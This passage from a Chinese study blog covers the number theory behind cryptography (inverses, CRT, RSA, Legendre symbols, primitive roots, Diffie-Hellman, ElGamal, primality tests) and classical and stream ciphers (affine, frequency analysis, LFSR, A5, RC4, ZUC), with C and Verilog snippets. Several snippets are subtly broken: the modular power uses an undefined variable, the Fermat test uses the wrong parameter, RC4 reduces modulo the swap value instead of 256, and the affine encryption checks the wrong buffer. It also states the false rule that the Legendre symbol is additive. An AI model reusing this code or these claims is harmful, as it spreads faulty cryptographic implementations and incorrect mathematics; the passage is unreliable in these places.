gcd}(ax,m)=1$ 及 $ax_i\\not\\equiv ax_j({\\rm mod}\\ m)$, $i\\neq j$.\n逆元: 若 ${\\rm gcd}(a,m)=1$, 则 $\\exists ! x\\in\\mathbb{Z}_m^*$ s.t. $ax\\equiv 1({\\rm mod}\\ m)$. Euler: 若 ${\\rm gcd}(a,m)=1$, 则 $a^{\\varphi(m)}\\equiv 1({\\rm mod}\\ m)$.\n$\\mathbb{Z}_m^*=\\{x_1,\u0026hellip;,x_{\\varphi(m)}\\}=\\{ax_1,\u0026hellip;,a_{\\varphi(m)}\\}$, 故 $\\prod x_i\\equiv\\prod ax_i({\\rm mod}\\ m)$, 已知 ${\\rm gcd}(x_i,m)=1$, 得 $m|a^{\\varphi(m)}-1$.\n特别 $m=p$ 为素数时, Fermat: 若 $p\\nmid a$, 则 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 有 $a^{-1}\\equiv a^{p-2}({\\rm mod}\\ p)$. 由扩展Euclid, ${\\rm gcd}(a,m)=1$, $\\exists s,t\\in\\mathbb{Z}$ s.t. $as+tm=1$, 即 $a^{-1}\\equiv s({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 int inverseExtEuclid(int a, int m){ int s,t; int gcd = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (gcd == 1){ return s; } else { return 0; } } wilson: 素数 $p$ 有 $(p-1)!\\equiv -1({\\rm mod}\\ p)$.\n$\\mathbb{Z}_m^*$ 中元素均存在逆, 自逆仅 $1,p-1$; ${2,3,\u0026hellip;,p-2}$ 中两两配对互逆.\n1 2 3 4 5 6 7 bool wilson(int p){ int factMod = 1; for (int i = p-1; i \u0026gt;= 1; --i){ factMod = (factMod*i)%p; } return (factMod+1)%p == 0; } 仿射: ${\\rm gcd}(a,26)=1$, 密钥对数量 $26\\varphi(26)-1=311$.\n加密 $c=E_{a,b}(m)=am+b({\\rm mod}\\ 26)$. 解密 $m=D_{a,b}(c)=a^{-1}(c-b)({\\rm mod}\\ 26)$. 同余式 同余式 $f(x)\\equiv a_nx^n+\u0026hellip;+a_1x+a_0({\\rm mod}\\ m)$, $a_i\\in\\mathbb{z}$, $m\\in\\mathbb{Z}_+$. 同余方程 $f(x)\\equiv 0({\\rm mod}\\ m)$ 至多有 $m$ 个解(剩余类).\n一次同余 $ax\\equiv b({\\rm mod}\\ m)$, $a,b\\in\\mathbb{Z}$, $m\\in\\mathbb{Z}_+$ 有解 $\\iff {\\rm gcd}(a,m)|b$.\n$ax\\equiv b({\\rm mod}\\ m)$ 在 ${\\rm gcd}(a,m)=1$ 时有唯一解 $x\\equiv a^{-1}b({\\rm mod}\\ m)$. 记 $d={\\rm gcd}(a,m)$, 有 $\\frac{a}{d}x\\equiv \\frac{b}{d}({\\rm mod}\\ \\frac{m}{d})$, 即 $x=\\frac{b}{d}(\\frac{a}{d})^{-1}+k\\frac{m}{d}$, $k\\in\\mathbb{Z}$. 考虑 $k=qd+r$, $q,r\\in\\mathbb{Z}$, $0\\leq r\u0026lt; d$, $x=[\\frac{b}{d}(\\frac{a}{d})^{-1}({\\rm mod}\\frac{m}{d})+r\\frac{m}{d}]({\\rm mod\\ m})$.\n求解步骤:\n扩展Euclid求 $d={\\rm gcd}(a,m)$, 记 $sa+tm=d$; $b\\%d=0$ 判断有无解; 设 $b\u0026rsquo;=b/d$, $m\u0026rsquo;=m/d$, $s\u0026rsquo;\\equiv s({\\rm mod}\\ m\u0026rsquo;)$; 得 $x\\equiv s\u0026rsquo;b\u0026rsquo;+rm\u0026rsquo;\\ ({\\rm mod}\\ m)$, $r=0,1,\u0026hellip;,d-1$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int linearCongEq (int a, int b, int m, int ansX[]){ a %= m; b %= m; int s,t; int origM = m; int d = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (b%d == 0){ b /= d; m /= d; s %= m; for (int r = 0; r \u0026lt;= d-1; ++r){ ansX[r] = ((s*b+r*m)%(origM)+origM)%origM; } return d; } else { return 0; } } 一次同余组(CRT): $m_{i{1\\leq i \\leq k}}$ 两两互素, 同余组 $x\\equiv a_i({\\rm mod\\ m_i})_{{1\\leq i\\leq k}}$ 有唯一解 $x=\\sum M_i M_i^{-1} a_i \\ ({\\rm mod}\\ m)$. 其中, $m=\\prod m_i$, $M_i=m/m_i$, $M_i^{-1}$ 为模 $m_i$ 上的逆.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 long crt (int a[],int m[],int n){ int modSepM[n]; int modIevM[n]; long modM[n]; long prodM = 1; long x = 0; for (int i = 0; i \u0026lt; n; ++i){ prodM *= m[i]*1L; } for (int i = 0; i \u0026lt; n; ++i){ modM[i] = 1L*prodM/m[i]; modSepM[i] = (1L*modM[i])%m[i]; modIevM[i] = inverseExtEuclid(modSepM[i],m[i]); if (!modIevM[i]){ return 0; } } for (int i = 0; i \u0026lt; n; ++i) { x = (x+1L*modIevM[i]*modM[i]*a[i])%prodM; } x = (x+prodM)%prodM; return x; } RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$.\n公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv c^d({\\rm mod}\\ n)$. 快速模幂 $r\\equiv t^e({\\rm mod}\\ n)$ 1 2 3 4 5 6 7 8 9 10 11 int fastPowerMod (int t, int ex, int n){ int r = 1; while (ex){ if (ex\u0026amp;1){ r = (1LL*r*t)%modular; } t = (1LL*t*t)%modular; ex \u0026gt;\u0026gt;= 1; } return r; } 二次剩余 $ax^2+bx+c\\equiv 0({\\rm mod}\\ m)$ 总能简化为 $x^2\\equiv d({\\rm mod}\\ q^k)$, $q$ 为素数, $a,b,c,d,m,k\\in\\mathbb{Z}_+$. 仅考虑 $x^2\\equiv a({\\rm mod}\\ q)$, ${\\rm gcd}(a,p)=1$, $a\\in\\mathbb{Z}$ 为模素数 $q$ 的二次剩余.\nEuler: ${\\rm gcd}(a,p)=1$, $p$ 为奇素数, $a\\in\\mathbb{Z}$:\n模 $p$ 的二次剩余恰有 $\\frac{p-1}{2}$ 个. $a$ 为模 $p$ 二次剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$, 此时 $x^2\\equiv a({\\rm mod}\\ p)$ 有二解. $a$ 为模 $p$ 二次非剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv -1({\\rm mod}\\ p)$. 显然 $i^2\\equiv(p-i)^2({\\rm mod}\\ p)$; 若 $j^2\\equiv i^2({\\rm mod}\\ p)$, $1\\leq i\u0026lt;j\u0026lt;\\frac{p}{2}$, 则 $p|j-i$ 或 $p|j+i$, 但 $j+i\u0026lt;p$, 矛盾.\n$a$ 为模 $p$ 二次剩余时, $\\exists x_0\\in\\mathbb{Z}$, ${\\rm gcd}(x_0,p)=1$, $x_0^2\\equiv a({\\rm mod}\\ p)$, 故 $a^{\\frac{p-1}{2}}\\equiv x_0^{p-1}\\equiv 1({\\rm mod}\\ p)$.\n$a$ 为模 $p$ 二次非剩余时, 考虑 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 则 $p|{\\frac{p-1}{2}}-1$ 或 $p|{\\frac{p-1}{2}}+1$, 但 $x^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$ 的全部解恰为全部的二次剩余.\nLegendre: $(\\frac{a}{p})=a^{\\frac{p-1}{2}}\\%p=1\\ {\\rm or}\\ -1\\ {\\rm or}\\ 0$, $p$ 为素数, $a\\in\\mathbb{Z}$.\n$$ (\\frac{1}{p}) = 1;\\ (\\frac{ab}{p})=(\\frac{a}{p})(\\frac{b}{p}); \\ (\\frac{a+b}{p})=(\\frac{a}{p})+(\\frac{b}{p})$$\n$$(\\frac{a^2}{p})=1,\\ {\\rm gcd}(a,p)=1$$\n$$ (\\frac{-1}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%4=1\\\\ \u0026amp;-1,\\ \u0026amp;p\\%4=3 \\end{cases}$$\n$$ (\\frac{2}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%8=1,7\\\\ \u0026amp;-1,\\ \u0026amp;p\\%8=3,5 \\end{cases}$$\n二次互反: $(\\frac{p}{q})(\\frac{q}{p})=(-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}$, $p\\ne q$ 为奇素数.\nGuass: 奇素数 $p$, $a\\in\\mathbb{Z}$, ${\\rm gcd}(a,p)=1$, 设 $M_{a,p}=\\{ka\\%p, \\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\ |\\ ka\\%p\u0026gt;\\frac{p}{2}\\}$, 记 $m(a,p)=|M_{a,p}|$, 则 $(\\frac{a}{p})=(-1)^{m(a,p)}$.\n设 $K=\\{ka\\%p\\ |\\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\}$, $b_i\\in M$, $c_j\\in M-K$, $i=1,2,..,m(a,p)$, $j=1,2,\u0026hellip;,\\frac{p-1}{2}-m(a,p)$.\n显然有 $c_j\\ne p-b_i$, $\\forall i,j$; 否则 $p|b_i+c_j$, 即 $\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $p|a(x+y)$, 但 $x+y\u0026lt;p$, 矛盾.\n故 $a^{\\frac{p-1}{2}}(\\frac{p-1}{2})!\\equiv\\prod c_j \\prod (p-b_i)\\equiv (-1)^{m(a,p)}(\\frac{p-1}{2})!({\\rm mod}\\ p)$.\nEisenstein: $a$ 为奇数时, 记$e(a,p)=\\sum\\lfloor\\frac{ka}{p}\\rfloor$, 有 $e(a,p)\\equiv m(a,p)({\\rm mod}\\ 2)$.\n不妨设 $ka=d_kp+r_k$, $0\\leq r_k\\leq p-1$, $d_k,r_k\\in\\mathbb{Z}$, 有 $p\\sum d_k+\\sum r_k=\\sum ka = \\sum c_j+\\sum (p-b_i)$, 故 $\\sum d_k\\equiv m(a,p)({\\rm mod}\\ 2)$; 显然 $e(a,p)=\\sum d_k$.\n$q\\ne p$ 为奇素数时, $\\not\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $xp=qy$, 即 $e(p,q)+e(q,p)=\\frac{p-1}{2}\\frac{q-1}{2}$.\n$a=2$ 时, $\\lfloor\\frac{p}{4}\\rfloor\\leq k\\leq \\lfloor\\frac{p}{2}\\rfloor$, 有 $m=\\lfloor\\frac{p}{2}\\rfloor-\\lfloor\\frac{p}{4}\\rfloor$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int fastLegendre(int a, int p){ int s; int e = 0; if (a == 0 || a == 1){ return a; } else { while (a%2 == 0){ a /= 2; ++e; } if (e%2 == 0 || p%8 == 1 || p%8 == 7){ s = 1; } else { s = -1; } if (p%4 == 3 \u0026amp;\u0026amp; a%4 == 3){ s = -s; } if (a == 1){ return s; } else { return s*fastLegendre(p%a,a); } } } Rabin: 素数 $p\\equiv q\\equiv 3({\\rm mod}\\ 4)$.\n公钥 $n=pq$, 加密 $c\\equiv E_{n}(m)\\equiv m^2({\\rm mod}\\ n)$. 私钥 $(p,q)$, 解密 $m\\equiv D_{p,q}(c)\\equiv \\pm c^{\\frac{p+1}{4}}({\\rm mod}\\ p)\\equiv \\pm c^{\\frac{q+1}{4}}({\\rm mod}\\ q)\\ (2 in 4)$. 原根 原根: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 记 ${\\rm ord}_m(a)=\\inf\\{x\\in\\mathbb{Z}_+\\ | \\ a^x\\equiv 1({\\rm mod}\\ m)\\}$ 称为 $a$ 对模 $m$ 的阶; 特别, ${\\rm ord}_m(a)=\\varphi(m)$ 时称 $a$ 为模 $m$ 的原根.\n定理: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 则 $a^n\\equiv 1({rm mod}\\ m)\\iff {\\rm ord}_m(a)|n$. 特别, ${\\rm ord}_m(a)|\\varphi(m)$.\n定理: $g$ 为模 $m$ 原根 $\\iff g^{\\frac{\\varphi(m)}{p_i}}\\not\\equiv 1({\\rm mod}\\ m)$, $\\forall$ 素数 $p_i|\\varphi(m)$.\n必要性: 显然.\n充分性: 若 $\\exists e\u0026lt;\\varphi(m)$ s.t. $g^e\\equiv 1({\\rm mod}\\ m)$; 不妨设 $\\frac{\\varphi(m)}{e}=kp$, $k\\in\\mathbb{Z}$, $p$ 为素数; 进而 $g^{\\frac{\\varphi(m)}{e}\\equiv(g^p)^k\\equiv 1({\\rm mod}\\ m)}$, 矛盾.\n定理: $a,m,d\\in\\mathbb{Z}_+$, ${\\rm gcd}(a,m)=1$, ${\\rm ord}_m(a^d)=\\frac{{\\rm ord}_m(a)}{{\\rm gcd}({\\rm ord}_m(a),d)}$. 推论: 模 $m$ 存在原根时, 有 $\\varphi(\\varphi(m))$ 个原根; 同时原根为模 $m$ 上本原多项式的全部解. 以下显然:\n${\\rm ord}_m(a)={\\rm ord}_m(a^{-1})$. $b\\equiv a({\\rm mod}\\ m)$, 则 ${\\rm ord}_m(b)={\\rm ord}_m(a)$. ${\\rm gcd}(a,m)=1$, $a^0,a^1,\u0026hellip;,a^{{\\rm ord}_m(a)-1}$ 两两模 $m$ 不同余. 特别, $g$ 为模 $m$ 原根时, 恰好有 $\\mathbb{Z}_p^*={g^0,g^1,\u0026hellip;,g^{\\varphi(g)-1}}$. $g$ 为模 $m$ 原根时, $x,y\\in\\mathbb{Z}$, $g^x\\equiv g^y({\\rm mod}\\ m) \\iff x\\equiv y({\\rm mod}\\ \\varphi(m))$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 bool nMod1(int a, int n, int p, int* primeFact){ int num = 0, r; while(primeFact[num]){ r = fastPowerMod(a,n/primeFact[num],p); if (r == 1){ break; } else { ++num; } if(!primeFact[num]) { return true; } } return false; } int minPrimeRoot(int p){ int n = p-1, res = 0; int primeFact[10] = {0}; factPrime(n,primeFact); for (int i = 2; i \u0026lt;= p/2; ++i) { if (nMod1(i,n,p,primeFact)){ res = i; break; } } return res; } D-H协议: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq x,y\\leq p-1$.\n公钥 $(p,g)$, 私钥 $x,y$. 握手: $k_{X\\to Y}\\equiv g^x({\\rm mod}\\ p)$, $k_{Y\\to X}\\equiv g^y({\\rm mod}\\ p)$. 密钥: $k\\equiv k_{Y\\to X}^x\\equiv k_{X\\to Y}^y \\equiv g^{xy}({\\rm mod}\\ p)$. ElGamal: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq a\\leq p-1$, $Y_a\\equiv g^a({\\rm mod}\\ p)$.\n公钥 $(p,g,Y_a)$, 加密 $u\\equiv g^k({\\rm mod}\\ p)$, $v\\equiv mY_a^k({\\rm mod}\\ p)$, $c=E_{p,g,Y_a,k}(m)=(u,v)$, 任选 $2\\leq k\\leq p-1$. 私钥 $a$, 解密 $m\\equiv D_a(c)\\equiv \\frac{v}{u_a}({\\rm mod}\\ p)$. 素性检验 1 2 3 4 5 6 7 bool fermat(int n){ int a,r; srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,p-1,p); return r == 1; } 1 2 3 4 5 6 7 8 9 bool solovayStrassenX(int p){ int a, x, y; srand((unsigned int)time(0)); a = rand()%p+1; x = jacobi(a,p); // jacobi同fastLegendre x = (x+p)%p; y = fastPowerMod(a,(p-1)/2,p); return x != 0 \u0026amp;\u0026amp; x == y; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bool millerRabin(int p){ int k = 0, t = p-1, a, r; while(t%2 == 0){ t \u0026gt;\u0026gt;= 1; ++k; } srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,t,p); if (r == 1){ return true; } else{ for (int j = 0; j \u0026lt; k; ++j) { if (r == p-1){ return true; } else { r = (1LL*r*r)%p; } } } return false; } 群 有限群: 有限集 $G$ 上代数运算满足结合律, 存在单位元(记 $e$), 逆元(记 $a^{-1}$); 记 $|G|={\\rm Card}(G)$ 为阶; 定义 $a^{-n}=(a^{-1})^n$, $a^0=e$.\n元素的阶: $|a|=\\inf \\{n\\in\\mathbb{N}_+\\ |\\ a^n = e\\}$; $|a^{-1}|=|a|$, $|a^d|=\\frac{|a|}{{\\rm gcd}(|a|,d)}$; 若 $n\\in\\mathbb{Z}$, $a^n=e$ 则 $|a||n$.\n子群: 群 $G$ 的非空子集 $H$ 关于 $G$ 的代数运算构成群, 记 $H\u0026lt;G$; 真子群即非平凡子群({e},G); $H\u0026lt;G$ 则 $e\\in H$, $e\\in G$, 且 $\\forall a\\in H$, $a^{-1}\\in G$; $H\u0026lt;G \\iff \\forall a,b\\in H$, $ab^{-1}\\in H$.\n循环群: 群 $G$ 的非空子集 $S$, 生成子群 $\\langle S\\rangle=\\bigcap_{S\\subset H\u0026lt;G}H=\\{\\prod a_i^{l_i}\\ |\\ a_i\\in S, l_i=\\pm 1\\}$; 特别 $S={a}$ 时, 循环子群 $\\langle S\\rangle=\\langle a\\rangle=\\{a^n\\ |\\ n\\in\\mathbb{Z}\\}$; 特别 $G=\\langle a\\rangle$ 时为循环群 $\\iff\\exists a\\in G$ s.t. $|a|=|G|$; 循环群子群仍为循环群; 无限循环群同构于 $\\mathbb{Z}$, $n$ 阶循环群同构于 $\\mathbb{Z}_n$.\n不妨设 $H\u0026lt;G=\\langle a\\rangle$, $H\\ne {e}$, $\\exists a^k\\in H$, $a^{-k}\\in H$, 则 $\\exists r,t\\in\\mathbb{Z}_+$, $q\\in\\mathbb{Z}$ s.t. $a^r\\in H$, $n=qr+t$; 进而 $a^n=a^{qr+t}\\in H$ 即 $t=0$, 故 $H\\subset \\langle a^r\\rangle$.\n陪集: $H\u0026lt;G$, $\\forall a\\in G$, $aH$ 为左陪集; $a\\in aH$, $aH=H\\iff a\\in H$, $aH=bH$ 或 $aH\\cap bH=\\empty$, $|H|=|aH|$; $G=\\bigcup_{g\\in G}gH$.\nLagrange: 记 $[G:H]=\\frac{|G|}{|H|}$, $|G|=[G:H]|H|$; $|a|||G|$.\n正规子群: $H\u0026lt;G$, $\\forall a\\in G$, $aH=Ha$, 记 $H\\lhd G$; $H\u0026lt;G$, $\\forall a\\in G$, $H\\lhd G \\iff aHa^{-1}=H \\iff aHa^{-1} \\subset H \\iff aha^{-1}\\in H$, $\\forall h\\in H$.\n商群: $H\\lhd G$, $G/H=\\{aH\\ |\\ a\\in G\\}$, $aH\\ast bH=(ab)H$.\n同态: 保持代数运算不变的映射, 双射时为同构. 群同态: 群 $G_1,G_2$, 映射 $f:G_1\\to G_2$, $f(ab)=f(a)f(b)$, $\\forall a,b\\in G_1$.\n置换群: 非空集合 $X$ 上所有可逆变换(双射)关于复合构成对称群 $S_x$; $S_x$ 子群称为变换群; 特别 $|X|=n$ 时, 记 $S_x = S_n$, $S_n$及其子群称为置换群, 元素 $\\sigma$ 称为置换; $|S_n|=n!$.\n轮换: $f\\in S_n$, $i_1,\u0026hellip;,i_r\\in X$, $f(i_1)=i_2,\u0026hellip;,f(i_{r-1})=i_r,f(i_r)=i_1$ 且保持其他元素不变时, $f=(i_1,i_2,\u0026hellip;,i_r)$ 称为 $r$ -轮换; 特别 $r=1$ 时为恒等变换, $r=2$ 时称为对换; 任意置换可唯一表示为不相交的轮换之积; 任意轮换可以表示为对换之积.\nCayley: 任意有限群同构于一置换群.\n环 域 ","date":"2023-09-05T00:00:00Z","permalink":"https://example.com/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"密码学数学基础"},{"content":"基础 基本属性: 信息机密性, 信息真实性, 数据完整性, 行为不可否认性.\n体制: $(M,C,K_1,K_2,E,D)$ 明文空间, 密文空间, 加密密钥空间, 解密密钥空间, 加密空间, 解密空间; 加密变换 $c=E_{k_1}(m)$, 解密变换 $m=D_{k_2}(c)$.\n类别: 对称加密, 非对称加密, Hash函数, 密码协议.\n分析: 唯密文攻击, 已知明文攻击, 选择明文攻击, 选择密文攻击, 自适应选择明文攻击, 选择密钥攻击.\n评价: 无条件安全 $P(M|C)=P(M)$; 可证明安全(破解本质为数学难题); 计算安全(破解代价超过信息价值;破解时间超过信息时效).\n攻击: 被动攻击(监听-信息机密性); 主动攻击(伪造-信息真实性,篡改-数据完整性,否认-行为不可否认性).\n古典密码 古典密码主要为置换密码和代换密码.\n置换密码: $\\sigma$ 为 $M$ 上一个置换(到自身的双射).\n加密: $(c_i)=E_{k}((m_i))=\\sigma_{k_i}((m_i))$. 解密: $(m_i)=D_{k}((c-i))=\\sigma_{k_i}^{-1}((c_i))$. 代换密码\n加密: $c_i=E_{k}(m_i)\\equiv f(m_i,k)({\\rm mod}\\ 26)$. 解密: $m_i=E_{k}(c_i)\\equiv f^{-1}(c_i,k^{-1})({\\rm mod}\\ 26)$. 单表代换可以直接通过字母频率分析破解.\n1 2 3 4 5 6 7 8 9 10 11 void freqAnalyze(char *ciphertext, long *count){ int num = 0; while (ciphertext[num] != \u0026#39;\\0\u0026#39;){ if (isupper(ciphertext[num])){ count[ciphertext[num]-\u0026#39;A\u0026#39;]++; } else if (islower(ciphertext[num])){ count[ciphertext[num]-\u0026#39;a\u0026#39;]++; } ++num; } } 粗糙度: ${\\rm M.R}=\\sum_{i=0}^25(p_i-\\frac{1}{26})^2=\\sum_{i=0}^25p_i^2-0.0385$. 明文或单表代换时 ${\\rm M.R}\\approx 0.027$, 更接近 $0$ 则更可能为多表代换.\n重合指数: ${\\rm IC}=\\sum_{i=0}^25p_i^2$. 多表代换时 ${\\rm IC}\\approx 0.0655$. 相同字母间隔为 $d_1,\u0026hellip;,d_n$, 则密钥可能长度为 ${\\rm gcd}(d_1,\u0026hellip;,d_n)$.\n仿射密码 单表代换的代表.\n1 2 3 4 5 6 7 8 9 10 11 12 void affineEncrypt(char *plaintext, char *ciphertext, int keyA, int keyB){ long length = strlen(plaintext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;A\u0026#39;)+keyB)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;a\u0026#39;)+keyB)%26+\u0026#39;a\u0026#39;; } else { ciphertext[i] = plaintext[i]; } } } 1 2 3 4 5 6 7 8 9 10 11 12 void affineDecrypt(char *ciphertext, char *plaintext, int keyAReverse, int keyB){ long length = strlen(ciphertext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;A\u0026#39;-keyB))%26+26)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;a\u0026#39;-keyB))%26+26)%26+\u0026#39;a\u0026#39;; } else { plaintext[i] = ciphertext[i]; } } } Vernam密码 序列密码的基础.\n自同步序列密码 异或$\\rm XOR$ ($GF(2)$加法) $\\oplus$ 加密: 无条件安全; 可逆.\n与同步序列密码相比, 传输产生的错误有界.\n种子密钥通过LFSR(线性反馈移位寄存器)生成伪随机密钥序列 $k=k_0k_1k_2\u0026hellip;$.\n加密 $c_i=E_{k}(m)=m_i\\oplus k_i$. 解密 $m_i=D_{k}(m)=c_i\\oplus k_i$. LFSR: 状态 $(s_0,s_1,\u0026hellip;,s_{n-1})$, 递推关系式 $s_{n+k}=\\bigoplus g_is_i$, 反馈函数 $f(s_0,s_1,\u0026hellip;,s_{n-1})=\\sum g_is_i$, 连接多项式(特征多项式) $g(x)=\\sum g_ix_i$, $s_i,g_i,x_i\\in GF(2)$.\ne.g. $\\ g(x)=1+x+x^2+x^5$, $s_{5+i}=s_{i}+s_{1+i}+s_{4+i}$. $S_0=(1,0,1,1,1)$, $k=101110111011101110111\u0026hellip;$, $T=8$.\n使用verligo实现LFSR.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 32-bit long module lfsr(32)(clk, reset, lfsr); input clk, reset; output reg [31:0] lfsr; wire d0; xnor(d0, lfsr[31], lfsr[21], lfsr[1], lfsr[0]); always @(posedge clk, posedge reset) begin if(reset) begin lfsr \u0026lt;= 32\u0026#39;h00000001; end else begin lfsr \u0026lt;= {lfsr[30:0], d0}; end end endmodule 定理: $n$ 次特征多项式为 $GF(2^n)$ 上本原多项式时, 输出 $\\max T=2^n-1$ 序列($m$ 序列).\n将 $x^{2^n-1}-1$ 在 $GF(2^n)$ 上因式分解; 保留次数为 $n$ 且不能在 $GF(2^n)$ 上整除 $x^a-1,n\u0026lt;a\u0026lt;2^n-1$ 的因式. 截获长度 $l\\geq 2(2^n-1)$ 的明密文对 $(c,m)$, 则 $k=c\\oplus m$, 有 $S_i,\u0026hellip;,S_{i+n+1}$ 个状态; 记 $X=(S_i,\u0026hellip;,S_n)$, $Y=(S_{i+1},\u0026hellip;,S_{i+n+1})$, 有 $Y\\equiv HX({\\rm mod}\\ 2)$. $m$ 序列时, $X$满秩, $H\\equiv YX^{-1}({\\rm mod}\\ 2)$ 为特征多项式的友矩阵.\n$$H=\\left( \\begin{array}{} 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ \u0026hellip; \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 1 \\\\ g_0 \u0026amp; g_1 \u0026amp; g_2 \u0026amp; \u0026hellip; \u0026amp; g_{n-1} \\end{array}\\right )$$\n可引入非线性运算增加复杂性: 与AND($GF(2)$上乘法) $\\otimes$.\nAD5 欧洲移动通信GSM标准, 手机到基站间的链路语音加密. 由19位, 22位, 23位3个LSR组成; 时钟控制信号来自LSR1第8位, LSR2第10位, LSR3第10位; 若三者相同则均移位, 若两者相同则相同的移位, 不同的不移位; 即每个时钟至少有两个LSR移位.\n不同文献的连接多项式不同, 其中一个为:\n$$\\begin{cases} g_1(x)=x^{19}+x^{18}+x^{17}+x^{14}+1 \\\\ g_2(x)=x^{22}+x^{21}+1 \\\\ g_3(x)=x^{23}+x^{22}+x^{21}+x^8+1 \\end{cases}$$\n安全问题: 三个LSR长度过短; 种子密钥不同也会产生相同的密钥序列; 以目前计算能力不安全.\nRC4 基于非线性数据表变换. 密钥流产生分为2个阶段: 输入密钥并初始化排列S表; S表不断置换产生密钥流.\n初始化: 线性填充256字节S表, 密钥循环填充T表. $i$ 遍历 $0-255$, $j=(j+S[i]+T[i])\\%256$, 交换 $S[i]$ 和 $S[j]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void init(uint8 *S){ char key[256] = \u0026#34;\u0026#34;, T[256] = \u0026#34;\u0026#34;; printf(\u0026#34;Key:\u0026#34;); fgets(key,256,stdin); int keyLen = strlen(key); uint8 tmp = 0, j = 0, k = 0; for (int i = 0; i \u0026lt; 256; ++i) { S[i] = i; T[i] = key[i%keyLen]; } for (int i = 0; i \u0026lt; 256; ++i) { j = (j+S[i]+T[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; } } 产生密钥流: $i$ 循环遍历 $0-255$, $j=(j+S[i])\\%256$, 交换 $S[i]$ 和 $S[j]$, $t=(S[i]+S[j])\\%256$, $k_i=S[t]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 void rc4EnDe(uint8 *S, char *text, char *result){ int i = 0, j = 0, t = 0; uint8 tmp; unsigned long len = strlen(text); for (unsigned long k = 0; k \u0026lt; len; ++k) { i = (i+1)%256; j = (j+S[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; t = (S[i]+S[j])%tmp; result[k] = text[k]^S[t]; } } 安全问题: 存在弱密钥使得初始化置换后 $S$ 表顺序不变; 存在弱密钥使得密钥流在100万字节内完全重复; 密钥较短的容易被攻击, 但长度超过128位的密钥依然有效.\nZUC LTE-4G国际标准, 包含机密性128-EEA3和完整性128-EIA3, 基于LFSR的非线性组合逻辑结构. 分为三层结构: LSFR, Bit重组, 非线性F函数. 符号约定: $\\boxplus$ 为$GF(2^{32})$ 上加法; $|$ 为连接字符串; $_H$ 为高位16位; $_L$ 为低位16位; $\u0026lt; \u0026lt;_o$ 为循环左移.\n1 2 3 4 5 6 7 8 9 10 11 12 13 uint32 modAdd(uint32 a, uint32 b){ uint32 c = a+b; c = (c\u0026amp;0x7fffffff)+(c\u0026gt;\u0026gt;31); return c; } uint32 mod2ExpMulti(uint32 x, int exp){ return ((x\u0026lt;\u0026lt;exp)|(x\u0026gt;\u0026gt;(31-exp)))\u0026amp;0xfffffff; } uint32 rot(uint32 x, int mov){ return (x\u0026lt;\u0026lt;mov)|(x\u0026gt;\u0026gt;(31-mov)); } 输入参数: COUNT 计数器 32bit; BEARER 传载层标识 5bit; DIRECTION 传输方向标志 1bit; CK 密钥 128bit; IBS 输入比特流(明文或密文).\n密钥装入: 128bit扩展为16个31bit, $k=k_0|k_1|\u0026hellip;|k_{15}$, $v=v_0|v_1|\u0026hellip;|v_{15}$; 其中 $iv_0={\\rm COUNT}[0]$, $iv_1={\\rm COUNT}[1]$, $iv_2={\\rm COUNT}[2]$, $iv_3={\\rm COUNT}[3]$, $iv_4={\\rm BEARER}|{\\rm DIRECTION}|00$, 